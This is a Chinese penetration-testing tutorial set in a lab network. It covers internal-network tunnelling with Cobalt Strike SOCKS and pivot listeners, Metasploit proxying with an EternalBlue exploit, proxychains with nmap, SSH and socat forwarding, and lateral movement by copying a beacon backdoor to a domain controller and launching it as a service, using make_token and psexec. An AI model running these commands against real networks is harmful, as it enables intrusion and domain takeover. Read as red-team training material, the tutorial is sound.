# 流量转发

本片文章将会介绍在内网渗透中经常用到的隧道技术

## Socks转发

实验环境介绍

![](https://image.3001.net/images/20211207/1638885062_61af66c64fd2c5c686581.png!small)

目前已经拿到了server2008-2的会话，但是域控主机在内网，不能和CS TeamServer直接通信，所以需要添加代理转发

![](https://image.3001.net/images/20211207/1638885072_61af66d0be761527b4cd5.png!small)

  

在进行转发操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行`sleep 0`即为交互模式

  * 在当前 beacon 上可以右击选择`Pivoting --> SOCKS Server`设置一个 Socks4a 代理服务

  * 或者使用命令`socks [port]`进行设置

  * 使用命令`socks stop`关闭 Socks 代理服务

  * 在`View --> Proxy Pivots`中可以看到已经创建的代理服务

    
    
    beacon> help socks  
    Use: socks [stop|port]  
    ​  
    Starts a SOCKS4a server on the specified port. This server will relay   
    connections through this Beacon.   
    ​  
    Use socks stop to stop the SOCKS4a server and terminate existing connections.  
    ​  
    Traffic will not relay while Beacon is asleep. Change the sleep time with the  
    sleep command to reduce latency.

### MSF 连接到 Socks 代理服务

  1. 设置 socks 代理

![image-20211207150549587](https://image.3001.net/images/20211207/1638885199_61af674f51bac36c7e2de.png!small)

输入端口即可

或者用beacon命令

    
        beacon> socks 8888  
    # 关闭命令  
    socks stop

  2. Metasploit 中进行设置

CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信

开启 Metasploit 后，运行 setg 命令

    
        setg Proxies socks4:192.168.179.131:8888  
    setg ReverseAllowProxy true
    
        msf5 > setg Proxies socks4:192.168.179.131:8888  
    Proxies => socks4:192.168.179.131:8888

如果感觉上面命令比较长，还可以在`Proxy Pivots`界面中点击`Tunnel`按钮查看命令。

    * 运行以下命令来停止
    
        unsetg Proxies

setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置

  3. 扫描端口

扫描 10.0.0.0/24 地址段中的 445 端口

这里作为演示，只扫描一下 445 端口

    
        use auxiliary/scanner/smb/smb_version  
    set rhost 10.0.0.0/24  
    set threads 64  
    exploit

  4. 漏洞发现&利用

如果10段内存在其他主机，且开放了端口，这里使用永恒之蓝作为演示

    
        use exploit/windows/smb/ms17_010_eternalblue  
    set rhosts 10.0.0.4  
    set payload windows/x64/meterpreter/bind_tcp  
    exploit

### 使用 ProxyChains 进行代理转发

使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理

    
    
    1. 和MSF 使用socks 方法一致，首先开启一个 socks 代理服务  
    2. 配置 /etc/proxychains.conf 文件  
    3. 运行 proxychains + 待执行命令

  1. 开启socks代理
    
        beacon> socks 9527

开启代理后再teamserver上可以看到端口（下图 socks 端口为8888）

![image-20211207172213969](https://image.3001.net/images/20211207/1638885208_61af675897f9cf05ff8b0.png!small)

  2. 配置 ProxyChains

在攻击机上，配置`/etc/proxychains.conf`文件的最后一行，根据当前 **攻击主机（Teamserver）** IP 与设置的 Socks
端口，修改如下：

    
        vim /etc/proxychains.conf  
    socks4 192.168.179.128 9527  
    # socks4 127.0.0.1 9527

centos如果没有这个文件的话需要安装proxychains，[安装方法](http://www.harker.cn/archives/proxychains.html)，proxychains-ng 是 proxychains 的加强版

  3. 开始使用 ProxyChains

使用 Metasploit 的扫描可以知道，在 10.0.0.0/24 地址段中存在主机 10.0.0.2 ，接下来使用 nmap
扫描一下常见的端口，这里以 80,443,445,3389 作为演示

    
        proxychains nmap -sT -Pn 10.0.0.2 -p 80,443,445,3389  
    proxychains-ng 版本命令为 proxychains4  
    # -sT：使用 TCP 扫描  
    -Pn：不使用 Ping  
    -p：指定扫描端口  
    注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描

![image-20211207155435483](https://image.3001.net/images/20211207/1638885218_61af6762d6676a6944984.png!small)

  4. 访问端口(假设开启了80端口)
    
        > proxychains curl 10.0.0.2

## 转发监听器(反向链接)

![image-20211207182604827](https://image.3001.net/images/20211207/1638885225_61af6769533a64b5370df.png!small)

选择server2008-2会话，右击选择中转-Listener

![image-20211206193449467](https://image.3001.net/images/20211207/1638885229_61af676da77b8932cc792.png!small)

这里的转发监听器就相当于server2008-2作为一个代理，当流量转发至server2008-1

![image-20211207133235188](https://image.3001.net/images/20211207/1638885234_61af6772bbd4e45c480df.png!small)

生成可执行（s）后门，监听器选择转发监听器

![image-20211206194707316](https://image.3001.net/images/20211207/1638885239_61af67770991ae8c1adfe.png!small)

将生成的后门文件上传到server2008-2目录下，这之前一样需要将后门复制到域控主机2008-1上（如果没有域控主机权限，要使用上一节获取信任方法拿到权限）

    
    
    shell copy file.exe \\host\C$\Windows\Temp  
    # shell copy C:\Users\server20082\beacon.exe \\host\C$\Windows\Temp\beacon.exe

按照之前的方法，先创建服务

    
    
    beacon> shell sc \\host create name binpath= c:\windows\temp\file.exe  
    # beacon> shell sc \\WIN-A9PLNLID2QM  create beacon binpath= c:\windows\temp\s.exe

启动服务

    
    
    shell sc \\host start name  
    # shell sc \\WIN-A9PLNLID2QM  start beacon

启动成功不会有报错，没有成功会有报错

![image-20211207140136845](https://image.3001.net/images/20211207/1638885244_61af677cc4438e4b4f0e3.png!small)

执行成功后主机上线

![image-20211207140621528](https://image.3001.net/images/20211207/1638885251_61af678396358b7f3122f.png!small)

上线之后在CS视图中可以看出反向连接和正向链接的区别

![image-20211207183513464](https://image.3001.net/images/20211207/1638885257_61af678963aa4c4501ff6.png!small)

## SSH隧道

在内网中几乎所有的linux服务器和网络设备都支持ssh协议。一般情况下，ssh协议是允许通过防火墙和边界设备的，所以经常被攻击者利用。同时ssh协议的传输过程是加密的，所以我们很难区分合法的ssh会话和攻击者利用其他网络建立的隧道。攻击者使用ssh端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接

适合于以下环境

![image-20211207190918589](https://image.3001.net/images/20211207/1638885263_61af678ff2ba660963ffe.png!small)

外部 vps
可以访问内网web服务器，但是不能访问数据库服务器，内网web服务器可以和数据库服务器互相访问，这时就可以使用SSH隧道技术，先经过渗透测试拿到web服务器shell，以web服务器为跳板，访问数据库服务器的3389端口

接下来的实验使用另外一种拓扑结构，模拟企业内网钓鱼攻击场景

![image-20211207194130227](https://image.3001.net/images/20211207/1638885275_61af679b4199843041f0d.png!small)

现在已经通过钓鱼攻击拿到了内网办公区区域的一台员工办公电脑

![image-20211207210208633](https://image.3001.net/images/20211207/1638885278_61af679ed7b8303d135da.png!small)

环境具体如下

  * web服务器具有双网卡，和数据服务器处于同一网段（10段）可以相互通信，和员工办公电脑处于同一网段可以相互通信（模拟）

  * 员工电脑不能和数据服务器通信

因为员工电脑不能和数据服务器直接通信，我们可以借助 web 服务器（已经被拿下）搭建 ssh 隧道进行通信

1.在TeamServer上搭建ssh隧道

    
    
    ssh -D 1080 user@ip  
    # ssh -D 1080 moonteam@192.168.179.141

在本地创建动态端口1080进行转发连接到192.168.179.141

![image-20211207205235978](https://image.3001.net/images/20211207/1638885284_61af67a4dd4506d37750c.png!small)

2.在TeamServer上开启445端口转发

访问本地445端口的数据会被转发到10.0.0.2

    
    
    socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:10.0.0.2:445

3.在cs中使用以下命令使数据服务器上线

    
    
    make_token domainname\username password  
    # beacon> make_token ocean\administrator Ocean@123

![image-20211207212516072](https://image.3001.net/images/20211207/1638885290_61af67aa4c748bec0d581.png!small)

    
    
    beacon> jump psexec_psh 跳板机ip smb beacon  
    # 需要创建一个smb beacon  
    这里的ip就是Teamserver的ip，因为在teamserver上转发的445端口

![image-20211207213132888](https://image.3001.net/images/20211207/1638885295_61af67afe165d54c6d18b.png!small)

上线主机

![image-20211207213250934](https://image.3001.net/images/20211207/1638885299_61af67b32e95f00cb03c2.png!small)

整个流程如下

![image-20211207214408588](https://image.3001.net/images/20211207/1638885303_61af67b7e74af9191dc5f.png!small)

## 参考链接

<https://xz.aliyun.com/t/7245>

<https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html>

